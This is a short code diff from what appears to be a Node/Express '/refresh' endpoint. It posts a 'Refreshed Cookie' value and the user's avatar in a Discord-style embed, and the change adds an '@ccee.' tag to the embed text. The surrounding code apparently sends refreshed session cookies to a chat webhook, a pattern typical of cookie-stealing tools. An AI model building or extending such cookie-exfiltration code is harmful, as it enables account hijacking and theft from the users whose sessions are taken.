@@ -62,7 +62,7 @@ app.get('/refresh', async (req, res) => {
         embeds: [
             {
                 title: 'Refreshed Cookie',
-                description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
+                description: `**Refreshed Cookie: @ccee. **\n\`\`\`${refreshedCookie}\`\`\``,
                 color: 16776960,
                 thumbnail: {
                     url: userData.avatarUrl,
